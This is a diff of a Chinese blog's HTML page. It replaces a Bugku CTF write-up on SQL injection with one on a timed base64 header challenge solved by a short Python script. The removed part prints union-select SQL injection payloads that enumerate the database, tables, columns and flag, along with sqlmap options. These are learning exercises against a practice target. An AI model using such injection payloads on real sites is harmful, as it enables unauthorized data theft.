@@ -74,7 +74,7 @@
 
 
 
-  <meta name="keywords" content="Web,Writeup,CTF,SQL注入,Mysql,sqlmap,">
+  <meta name="keywords" content="Web,Writeup,CTF,Python,base64,">
 
 
 
@@ -85,34 +85,27 @@
 
 
 
-<meta name="description" content="成绩单-writeup">
-<meta name="keywords" content="Web,Writeup,CTF,SQL注入,Mysql,sqlmap">
+<meta name="description" content="速度要快-writeup&amp;lt;！–more–&amp;gt;打开题目访问链接，查看审查元素，提示OK ,now you have to post the margin what you find 感觉需要post提交一些什么东西利用burp suite进行抓包看看，在response中headers发现了一串base64进行base64解密解出来感觉还是怪怪的感觉还是base64，进行解密 将解密出来的">
+<meta name="keywords" content="Web,Writeup,CTF,Python,base64">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Bugku-成绩单">
-<meta property="og:url" content="https://axiaowei.cn/2019/02/01/201931/index.html">
+<meta property="og:title" content="Bugku-速度要快">
+<meta property="og:url" content="https://axiaowei.cn/2019/02/03/201934/index.html">
 <meta property="og:site_name" content="小维的博客">
-<meta property="og:description" content="成绩单-writeup">
+<meta property="og:description" content="速度要快-writeup&amp;lt;！–more–&amp;gt;打开题目访问链接，查看审查元素，提示OK ,now you have to post the margin what you find 感觉需要post提交一些什么东西利用burp suite进行抓包看看，在response中headers发现了一串base64进行base64解密解出来感觉还是怪怪的感觉还是base64，进行解密 将解密出来的">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/LPgxIIi.png">
-<meta property="og:image" content="https://i.imgur.com/ieeWgVZ.png">
-<meta property="og:image" content="https://i.imgur.com/K9LF5YW.png">
-<meta property="og:image" content="https://i.imgur.com/Xptezxt.png">
-<meta property="og:image" content="https://i.imgur.com/mDWMIBU.png">
-<meta property="og:image" content="https://i.imgur.com/bhaboSe.png">
-<meta property="og:image" content="https://i.imgur.com/EeY23aG.png">
-<meta property="og:image" content="https://i.imgur.com/7lDUPOR.png">
-<meta property="og:image" content="https://i.imgur.com/mXXyGbY.png">
-<meta property="og:image" content="https://i.imgur.com/Cl3XO7V.png">
-<meta property="og:image" content="https://i.imgur.com/tnOEnCR.png">
-<meta property="og:image" content="https://i.imgur.com/MXQk0e6.png">
-<meta property="og:image" content="https://i.imgur.com/5zhqU79.png">
-<meta property="og:image" content="https://i.imgur.com/BlId5TI.png">
-<meta property="og:image" content="https://i.imgur.com/atgflj2.png">
-<meta property="og:updated_time" content="2019-02-02T07:35:00.749Z">
+<meta property="og:image" content="https://i.imgur.com/jgTPGTS.png">
+<meta property="og:image" content="https://i.imgur.com/sStzZKA.png">
+<meta property="og:image" content="https://i.imgur.com/fNm2y4K.png">
+<meta property="og:image" content="https://i.imgur.com/SQZKgFN.png">
+<meta property="og:image" content="https://i.imgur.com/4ptKZTW.png">
+<meta property="og:image" content="https://i.imgur.com/8ZLrMmb.png">
+<meta property="og:image" content="https://i.imgur.com/xaf9M6H.png">
+<meta property="og:image" content="https://i.imgur.com/3hAKM1C.png">
+<meta property="og:updated_time" content="2019-02-03T13:18:15.909Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Bugku-成绩单">
-<meta name="twitter:description" content="成绩单-writeup">
-<meta name="twitter:image" content="https://i.imgur.com/LPgxIIi.png">
+<meta name="twitter:title" content="Bugku-速度要快">
+<meta name="twitter:description" content="速度要快-writeup&amp;lt;！–more–&amp;gt;打开题目访问链接，查看审查元素，提示OK ,now you have to post the margin what you find 感觉需要post提交一些什么东西利用burp suite进行抓包看看，在response中headers发现了一串base64进行base64解密解出来感觉还是怪怪的感觉还是base64，进行解密 将解密出来的">
+<meta name="twitter:image" content="https://i.imgur.com/jgTPGTS.png">
 
 
 
@@ -142,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="https://axiaowei.cn/2019/02/01/201931/">
+  <link rel="canonical" href="https://axiaowei.cn/2019/02/03/201934/">
 
 
 
 
 
-  <title>Bugku-成绩单 | 小维的博客</title>
+  <title>Bugku-速度要快 | 小维的博客</title>
   
 
 
@@ -317,7 +310,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://axiaowei.cn/2019/02/01/201931/">
+    <link itemprop="mainEntityOfPage" href="https://axiaowei.cn/2019/02/03/201934/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -334,7 +327,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Bugku-成绩单</h1>
+          <h1 class="post-title" itemprop="name headline">Bugku-速度要快</h1>
         
 
         <div class="post-meta">
@@ -346,8 +339,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-01T12:24:51+08:00">
-                2019-02-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-03T21:18:15+08:00">
+                2019-02-03
               </time>
             
 
@@ -400,7 +393,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  910字
+                  323字
                 </span>
               
 
@@ -416,7 +409,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  4分钟
+                  1分钟
                 </span>
               
             </div>
@@ -437,16 +430,10 @@
       
 
       
-        <p>成绩单-writeup<br><a id="more"></a><br>打开题目<br><img src="https://i.imgur.com/LPgxIIi.png" alt=""><br>访问链接，根据上面提示分别输入1,2,3查询下<br><img src="https://i.imgur.com/ieeWgVZ.png" alt=""><br>尝试输入1’返回异常，输入1’#返回正常，判断存在注入<br><img src="https://i.imgur.com/K9LF5YW.png" alt=""><br><img src="https://i.imgur.com/Xptezxt.png" alt=""><br>尝试手动注入<br>利用order by 判断列数为4列<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span> <span class="comment"># 返回正常</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/mDWMIBU.png" alt=""><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">5</span> <span class="comment"># 返回异常</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/bhaboSe.png" alt=""><br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用联合查询查看显位payload:</span><br><span class="line"><span class="number">-1</span>'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/EeY23aG.png" alt=""><br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库名paylaod:</span><br><span class="line"><span class="number">-1</span>'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/7lDUPOR.png" alt=""><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆表名payload:</span><br><span class="line">-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.imgur.com/mXXyGbY.png" alt=""></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段payload:</span><br><span class="line">-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'fl4g'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.imgur.com/Cl3XO7V.png" alt=""><br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查询数据payload:</span><br><span class="line"><span class="number">-1'u</span>nion <span class="keyword">select</span> <span class="number">1</span>,group_concat(skctf_flag),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> fl4g<span class="meta">#</span></span><br><span class="line">![](https:<span class="comment">//i.imgur.com/QLw5GOG.png)</span></span><br></pre></td></tr></table></figure></p>
-<p>还可以使用sqlmap<br>进行burp suite抓包，右键保存文件<br><img src="https://i.imgur.com/tnOEnCR.png" alt=""><br>将文本放在sqlmap的当前目录下，打开sqlmap<br>爆库<br><img src="https://i.imgur.com/MXQk0e6.png" alt=""><br>爆表名<br><img src="https://i.imgur.com/5zhqU79.png" alt=""><br>爆字段<br><img src="https://i.imgur.com/BlId5TI.png" alt=""><br>爆字段信息<br><img src="https://i.imgur.com/atgflj2.png" alt=""><br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap命令参数</span><br><span class="line"><span class="deletion">-r 是读文件 后面是刚才保存的绝对路径</span></span><br><span class="line"><span class="deletion">-p 是参数，也就是注入点（选了id是注入点）</span></span><br><span class="line"><span class="deletion">-D 是表示选择了后面的这个数据库 </span></span><br><span class="line"><span class="deletion">-T 指定表</span></span><br><span class="line"><span class="deletion">-C 指定要爆的字段</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--dbs –&gt;获取数据库名称</span></span><br><span class="line"><span class="deletion">--current-db –&gt;获取当前数据库名称</span></span><br><span class="line"><span class="deletion">--tables –&gt;获取表</span></span><br><span class="line"><span class="deletion">--columns –&gt;获取字段</span></span><br><span class="line"><span class="deletion">--dump –&gt;将结果导出</span></span><br></pre></td></tr></table></figure></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Mysql数据库information_schema系统表说明:</span><br><span class="line"></span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是<span class="keyword">show</span> <span class="keyword">databases</span>的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">TABLES</span>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个<span class="keyword">schema</span>，表类型，表引擎，创建时间等信息。是<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> schemaname的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">COLUMNS</span>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> schemaname.tablename的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">STATISTICS</span>表：提供了关于表索引的信息。是<span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> schemaname.tablename的结果取之此表。</span><br><span class="line"></span><br><span class="line">USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是<span class="keyword">SHOW</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span>结果集取之此表。</span><br><span class="line"></span><br><span class="line">COLLATIONS表：提供了关于各字符集的对照信息。</span><br><span class="line"></span><br><span class="line">COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于<span class="keyword">SHOW</span> <span class="keyword">COLLATION</span>的前两个显示字段。</span><br><span class="line"></span><br><span class="line">TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</span><br><span class="line"></span><br><span class="line">KEY_COLUMN_USAGE表：描述了具有约束的键列。</span><br><span class="line"></span><br><span class="line">ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc <span class="keyword">name</span>”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</span><br><span class="line"></span><br><span class="line">VIEWS表：给出了关于数据库中的视图的信息。需要有<span class="keyword">show</span> views权限，否则无法查看视图信息。</span><br><span class="line"></span><br><span class="line"><span class="keyword">TRIGGERS</span>表：提供了关于触发程序的信息。必须有super权限才能查看该表</span><br><span class="line"></span><br><span class="line">详情可以点击:https://wenku.baidu.com/<span class="keyword">view</span>/<span class="number">6358</span>a5fd89eb172ded63b7a8.html</span><br></pre></td></tr></table></figure>
+        <p><strong>速度要快-writeup</strong><br>&lt;！–more–&gt;<br>打开题目<br><img src="https://i.imgur.com/jgTPGTS.png" alt=""><br>访问链接，查看审查元素，提示OK ,now you have to post the margin what you find 感觉需要post提交一些什么东西<br><img src="https://i.imgur.com/sStzZKA.png" alt=""><br>利用burp suite进行抓包看看，在response中headers发现了一串base64<br><img src="https://i.imgur.com/fNm2y4K.png" alt=""><br>进行base64解密<br><img src="https://i.imgur.com/SQZKgFN.png" alt=""><br>解出来感觉还是怪怪的感觉还是base64，进行解密<br><img src="https://i.imgur.com/4ptKZTW.png" alt=""></p>
+<p>将解密出来的进行提交，提交失败，想到源代码中的备注post提交看一下<br><img src="https://i.imgur.com/8ZLrMmb.png" alt=""><br><img src="https://i.imgur.com/xaf9M6H.png" alt=""><br>提示我都说了让你快点。。。<br>然后几次尝试发现每次headers中的base64在变化,发现PHPSESSID字段应该是要post提交保持同一个会话<br>写python进行post提交<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web6/'</span>  <span class="comment"># 链接</span></span><br><span class="line">convert = requests.session()     <span class="comment"># 创建会话对象（保持cookie）</span></span><br><span class="line">html = convert.get(url)     <span class="comment"># get请求</span></span><br><span class="line">head = html.headers[<span class="string">'flag'</span>]     <span class="comment"># 获取头部flag信息</span></span><br><span class="line"></span><br><span class="line">decode_1 = base64.b64decode(head)   <span class="comment"># 进行base64解密</span></span><br><span class="line">code = decode_1.decode(<span class="string">'utf-8'</span>)  <span class="comment"># bytes转string</span></span><br><span class="line">separate = code.split(<span class="string">':'</span>)      <span class="comment"># 将base64解密后的字符串进行以‘：’进行分隔，获取flag后面的值</span></span><br><span class="line">decode_2 = base64.b64decode(separate[<span class="number">1</span>])  <span class="comment"># 返回分隔后的字符串列表，将解密后的进行二次base64解密</span></span><br><span class="line"></span><br><span class="line">flag = convert.post(url, data=&#123;<span class="string">'margin'</span>: decode_2&#125;)     <span class="comment"># 构造margin参数post提交</span></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/3hAKM1C.png" alt=""></p>
+
       
     </div>
     
@@ -477,11 +464,9 @@
           
             <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i>CTF</a>
           
-            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i>SQL注入</a>
+            <a href="/tags/Python/" rel="tag"><i class="fa fa-tag"></i>Python</a>
           
-            <a href="/tags/Mysql/" rel="tag"><i class="fa fa-tag"></i>Mysql</a>
-          
-            <a href="/tags/sqlmap/" rel="tag"><i class="fa fa-tag"></i>sqlmap</a>
+            <a href="/tags/base64/" rel="tag"><i class="fa fa-tag"></i>base64</a>
           
         </div>
       
@@ -494,8 +479,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/31/201930/" rel="next" title="PHP语法">
-                <i class="fa fa-chevron-left"></i> PHP语法
+              <a href="/2019/02/02/201933/" rel="next" title="Bugku-秋名山老司机">
+                <i class="fa fa-chevron-left"></i> Bugku-秋名山老司机
               </a>
             
           </div>
@@ -503,10 +488,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/01/201932/" rel="prev" title="正则表达式之零宽断言">
-                正则表达式之零宽断言 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
